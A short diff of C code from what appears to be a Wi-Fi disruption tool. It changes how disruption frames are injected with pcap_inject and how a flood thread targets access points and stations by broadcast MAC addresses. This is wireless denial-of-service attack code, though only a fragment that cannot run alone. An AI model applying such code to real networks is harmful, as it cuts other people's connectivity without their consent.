@@ -264,11 +264,11 @@ void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uin
 			packetToAp = construct_packet(tap, headerToAp, 0x3, &lenAp);
 		
 		pcap_inject(handle, (void*)packetToSta, (int)lenSta);
-		pcap_inject(handle, (void*)packetToAp, (int)lenAp);
+
+		if(!broadcast)
+			pcap_inject(handle, (void*)packetToAp, (int)lenAp);
 		
 		usleep(50000);
-		fflush(stdout);
-
 		
 		if(!broadcast)
 			free(packetToAp);
@@ -300,8 +300,8 @@ void action_flood_ap(struct loki_state *state) {
 void *flood(void *data) {
 	struct loki_state *state = (struct loki_state*)data;
 	struct beacon_frame_item *item = state->log->beacon.list;
-	uint8_t macSta[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
-		*macAp;
+	uint8_t macAp[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
+		*macSta;
 	uint16_t i;
 
 	i = 0;
@@ -311,9 +311,9 @@ void *flood(void *data) {
 
 	} while( (item = item->next) != NULL);
 
-	macAp = item->mac;
+	macSta = item->mac;
 
 	while(flood_ap) {
-		action_send_disruption(macAp, macSta, macAp, 10, 0, state->handle);
+		action_send_disruption(macAp, macSta, macAp, 10, 1, state->handle);
 	}
 }
